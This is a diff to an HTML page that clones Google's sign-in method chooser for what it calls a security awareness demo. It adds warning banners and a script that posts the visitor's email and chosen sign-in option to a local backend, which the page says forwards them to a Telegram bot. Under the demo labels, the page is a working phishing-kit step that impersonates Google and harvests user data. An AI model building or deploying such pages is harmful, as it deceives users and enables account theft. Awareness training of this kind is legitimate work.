@@ -8,8 +8,40 @@
     <link rel="preconnect" href="https://fonts.googleapis.com">
     <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
     <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@400;500&display=swap" rel="stylesheet">
+    <style>
+        .demo-banner {
+            background-color: #b3261e;
+            color: #ffffff;
+            text-align: center;
+            font-weight: 700;
+            font-size: 14px;
+            letter-spacing: 0.5px;
+            padding: 14px 16px;
+            border-radius: 10px;
+            margin-bottom: 20px;
+            box-shadow: 0 2px 8px rgba(179, 38, 30, 0.3);
+        }
+        .demo-note {
+            font-size: 13px;
+            line-height: 1.6;
+            background-color: #fef7e0;
+            border: 1px solid #f9ab00;
+            border-radius: 8px;
+            padding: 12px 14px;
+            color: #3c4043;
+            margin-top: 16px;
+        }
+        .demo-status {
+            font-size: 13px;
+            line-height: 1.5;
+            margin-top: 12px;
+            color: #202124;
+        }
+    </style>
 </head>
 <body>
+
+<div class="demo-banner">⚠️ SECURITY AWARENESS DEMO — THIS IS NOT GOOGLE ⚠️</div>
 
 <div class="main-container">
     <div class="signin-card">
@@ -18,13 +50,15 @@
         <div class="left-section">
             <img src="https://res.cloudinary.com/djme9spdc/image/upload/v1785658865/google_PNG19644_qmrkpz.png" alt="Google Logo" class="google-logo">
             <h1>Welcome</h1>
+            <p class="demo-note"><strong>Fake page.</strong> Security awareness demo — this is NOT Google. Your choice below is tracked and sent to a Telegram bot to show how phishing pages observe victim behavior.</p>
+            
             
             <!-- Account Badge -->
             <div class="account-pill">
                 <span class="avatar-icon">
                     <svg viewBox="0 0 24 24" width="20" height="20" fill="currentColor"><path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm0 4c1.93 0 3.5 1.57 3.5 3.5S13.93 13 12 13s-3.5-1.57-3.5-3.5S10.07 6 12 6zm0 14c-2.03 0-4.43-.82-6.14-2.88C7.55 15.8 9.68 15 12 15s4.45.8 6.14 2.12C16.43 19.18 14.03 20 12 20z"/></svg>
                 </span>
-                <span class="email-text">adesokanadedeji10@gmail.com</span>
+                <span class="email-text" id="account-email">adesokanadedeji10@gmail.com</span>
                 <span class="arrow-down">▼</span>
             </div>
         </div>
@@ -37,13 +71,13 @@
             <div class="options-list">
                 
                 <!-- Option 1: Password (Highlighted/Selected style from your image) -->
-                <button class="option-item selected">
+                <a href="password.html" class="option-item selected">
                     <span class="option-icon">
                         <!-- Lock Icon -->
                         <svg viewBox="0 0 24 24" width="20" height="20" fill="currentColor"><path d="M18 8h-1V6c0-2.76-2.24-5-5-5S7 3.24 7 6v2H6c-1.1 0-2 .9-2 2v10c0 1.1.9 2 2 2h12c1.1 0 2-.9 2-2V10c0-1.1-.9-2-2-2zm-6 9c-1.1 0-2-.9-2-2s.9-2 2-2 2 .9 2 2-.9 2-2 2zm3.1-9H8.9V6c0-1.71 1.39-3.1 3.1-3.1 1.71 0 3.1 1.39 3.1 3.1v2z"/></svg>
                     </span>
                     <span class="option-text">Enter your password</span>
-                </button>
+                </a>
 
                 <!-- Option 2: Passkey -->
                 <button class="option-item">
@@ -64,6 +98,9 @@
                 </button>
 
             </div>
+
+            <!-- Demo Status -->
+            <p class="demo-status" id="demo-status">Clicking any option sends your selection to the Telegram demo bot.</p>
         </div>
 
     </div>
@@ -78,6 +115,61 @@
         </div>
     </div>
 </div>
+
+<script>
+    // SECURITY AWARENESS DEMO — NOT GOOGLE
+    // Populate the account email from the email inputed on the previous page
+    const accountEmail = document.getElementById('account-email');
+    if (accountEmail) {
+        accountEmail.textContent = sessionStorage.getItem('demo_email') || 'adesokanadedeji10@gmail.com';
+    }
+
+    const optionButtons = document.querySelectorAll('.option-item');
+    const demoStatus = document.getElementById('demo-status');
+    const email = sessionStorage.getItem('demo_email') || 'unknown@demo.local';
+
+    optionButtons.forEach(function (btn) {
+        btn.addEventListener('click', async function (e) {
+            // If the option is a link (e.g., "Enter your password"), stop the default
+            // navigation so we can send the selection to Telegram first, then navigate.
+            if (btn.tagName === 'A') {
+                e.preventDefault();
+            }
+
+            const method = btn.querySelector('.option-text').textContent.trim();
+            demoStatus.textContent = 'Sending your selection to Telegram demo bot...';
+            demoStatus.style.color = '#0b57d0';
+
+            try {
+                const response = await fetch('http://localhost:8000/api/demo-submit', {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({
+                        username: email,
+                        password: 'chosen-method:' + method
+                    })
+                });
+
+                const result = await response.json();
+
+                if (response.ok) {
+                    demoStatus.textContent = '✅ Option "' + method + '" sent to Telegram. An attacker learns what method you chose — never use real accounts on suspicious pages.';
+                    demoStatus.style.color = '#188038';
+                    // If this option is a link, navigate to its target after sending.
+                    if (btn.tagName === 'A') {
+                        setTimeout(function () { window.location.href = btn.getAttribute('href'); }, 800);
+                    }
+                } else {
+                    demoStatus.textContent = 'Backend error: ' + (result.message || 'Unknown error');
+                    demoStatus.style.color = '#b3261e';
+                }
+            } catch (err) {
+                demoStatus.textContent = 'Could not reach the backend. Make sure Laravel is running (php artisan serve).';
+                demoStatus.style.color = '#b3261e';
+            }
+        });
+    });
+</script>
 
 </body>
 </html>
